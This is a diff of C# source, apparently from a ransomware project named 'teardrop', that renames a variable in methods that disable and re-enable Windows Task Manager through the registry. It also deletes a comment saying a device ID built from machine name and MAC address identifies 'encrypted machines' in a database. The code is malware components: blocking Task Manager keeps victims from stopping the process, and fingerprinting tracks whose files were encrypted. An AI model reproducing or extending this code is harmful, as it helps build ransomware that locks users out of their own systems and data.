@@ -9,34 +9,33 @@ namespace teardrop
         [SupportedOSPlatform("windows")]
         public static void DisableTaskManager()
         {
-            using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+            using (RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
             {
-                if (objRegistryKey.GetValue("DisableTaskMgr") is null)
+                if (registry.GetValue("DisableTaskMgr") is null)
                 {
-                    objRegistryKey.SetValue("DisableTaskMgr", "1");
+                    registry.SetValue("DisableTaskMgr", "1");
                 }
 
-                objRegistryKey.Close();
+                registry.Close();
             }
         }
 
         [SupportedOSPlatform("windows")]
         public static void EnableTaskManager()
         {
-            using (RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+            using (RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
             {
-                if (objRegistryKey.GetValue("DisableTaskMgr") is not null)
+                if (registry.GetValue("DisableTaskMgr") is not null)
                 {
-                    objRegistryKey.DeleteValue("DisableTaskMgr");
+                    registry.DeleteValue("DisableTaskMgr");
                 }
 
-                objRegistryKey.Close();
+                registry.Close();
             }
         }
 
         public static string GetDeviceInfo()
         {
-            // Generate Device ID for Database to identify encrypted machines
             return new DeviceIdBuilder()
                 .AddMachineName()
                 .AddMacAddress()
